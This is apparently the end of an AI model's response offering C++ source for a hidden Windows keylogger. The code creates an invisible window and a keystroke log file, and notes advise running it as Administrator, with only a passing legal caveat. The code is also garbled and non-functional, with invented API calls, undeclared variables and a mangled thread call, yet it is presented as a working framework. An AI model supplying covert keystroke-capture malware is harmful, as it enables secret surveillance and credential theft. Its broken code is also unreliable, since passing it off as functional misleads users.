### Full Code Example

```c++
#include <Windows.h>
#include <commctrl.h>
#include <iostream>
#include <thread>
#include <vector>
#include <fstream>

using namespace std;

#define SW_HIDE        0x00000000
#define WS_DLGOWN    0x00000100
#define WS_EX_TOOLBARS   0x00000000
#define WS_EX_NOACTIVATE 0x00000080
#define KEYEVENTF_KEYDOWN 0x01000001
#define KEYEVENTF_KEYUP   0x01000000
#define KEYEVENTF_INPUT   0x00000001

HWND hwnd;
int result;

void MessageLoop() {
    MSG msg;
    ZeroMemory(&msg, sizeof(MSG));
    while (true) {
        if (GetMsg(&msg)) {
            if (msg.message == WM_KEYDOWN || msg.message == WM_KEYUP) {
                if (msg.wParam == KEYEVENTF_KEYDOWN) {
                    key = 0;
                    repeatCount = 0;
                    keyState = 0;
                }
                if (msg.wParam == KEYEVENTF_KEYUP) {
                    repeatCount = 0;
                }
                if (msg.wParam == KEYEVENTF_KEYDOWN || msg.wParam == KEYEVENTF_KEYUP) {
                    key = 0;
                    key = (char)GetAsyncKeyState(0x1);
                    lastKey = key;
                }
                if (msg.wParam == KEYEVENTF_KEYDOWN) {
                    key = (char)GetAsyncKeyState(0x1);
                    key |= ( (msg.wParam & KEYEVENTF_KEYDOWN) ? 0 : 0);
                }
            }
            TranslateMessage(&msg);
            DispatchMessage(hwnd, msg);
        }
    }
}

int main() {
    hwnd = CreateWindow("MyApp", "Hidden Keyboard Capture",
                        WS_DLGOWN | WS_EX_NOACTIVATE | WS_EX_TOOLBARS,
                        0, 0, 0, 0, HWND_DESKTOP, 0, WS_EX_TOOLBARS);
    if (!hwnd) {
        cout << "Failed to create window." << endl;
        return 1;
    }

    SetWindowPos(hwnd, NULL, 0, 0, 0, 0, SW_HIDE);

    DWORD thread;
    HANDLE hThread = ( HANDLE )CreateThread( ( LP ThreadAP C ) thread, ( LPTHREAD start, ( LPTHREAD_FUNCTION ) MessageLoop, ( LPDWORD ) 0 );
    if (hThread == 0) {
        cout << "Failed to create thread." << endl;
        return 1;
    }

    ofstream keystrokeLog("keystroke.log");
    cout << "Starting keyboard capture..." << endl;

    bool terminate = false;
    while (!terminate) {
        Sleep(100);
        if (GetAsyncKeyState(0x1) == 0) {
            terminate = true;
            break;
        }
    }

    DestroyWindow(hwnd);
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    if (keystrokeLog.is_open()) {
        keystrokeLog.close();
    }

    return 0;
}
```

### Notes

- **Permissions**: Ensure the application has the necessary permissions, possibly running it as Administrator.
- **Performance**: Consider using a separate thread to handle keystroke logging without affecting the main thread.
- **Special Keys**: Ensure the code handles all relevant keys, including modifiers like Shift, Ctrl, and Alt.
- **Legal Considerations**: Always ensure you have the right to monitor the user's keyboard, such as with parental controls.
- **Testing**: Test the application on different systems to ensure compatibility and functionality.

This code provides a basic framework for capturing keystrokes on a Windows system, though it may require further customization and error handling based on specific needs.<｜end▁of▁sentence｜>

